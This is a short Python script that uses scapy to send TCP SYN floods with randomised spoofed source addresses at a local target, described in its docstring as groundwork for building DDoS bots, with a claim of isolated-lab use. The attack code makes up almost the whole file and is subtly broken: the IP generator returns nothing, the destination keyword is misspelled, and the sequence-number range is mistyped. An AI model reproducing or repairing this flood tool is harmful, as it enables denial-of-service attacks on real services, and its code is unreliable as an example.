"""
This project utilises scapy to create DDoS bots, 
either programmed to send continuous packets or misformed packets.

This bot is designed to send direct SYN floods using scapy in an isolated lab environment.
This script creates an sends TCP SYN packets with randomised source IP addresses,
and sequence numbers. This forms the basis of a single-source DDoS attack for later DDoS development.

* This is used only against my own systems, in an isolated lab environment with to internet connection *

"""

from scapy.all import TCP, IP, send
import random

# Config information:
dest_ip = "192.168.168.10" # testing-target ip
dest_port = 80
num_packets = 100 # number of packets to send


def random_ip():
    temp = []
    for i in range(4):
        temp.append(str(random.randint(1, 254)))
    ip = ".".join(temp)


def main():
    print(f"Starting SYN flood: \nSending {num_packets} to {dest_ip}:{dest_port}")

    for i in range(num_packets):
        spoof_ip = random_ip()
        random_seq = random.randint(0, 42967295)

        packet = IP(src=spoof_ip, std=dest_ip)/ TCP(
            dport=dest_port,
            flags="S",
            seq=random_seq
        )

        send(packet, verbose=0)

    print(f"\nPackets sent successfully. Sent {num_packets} SYN packets.")


if __name__ == "__main__":
    main()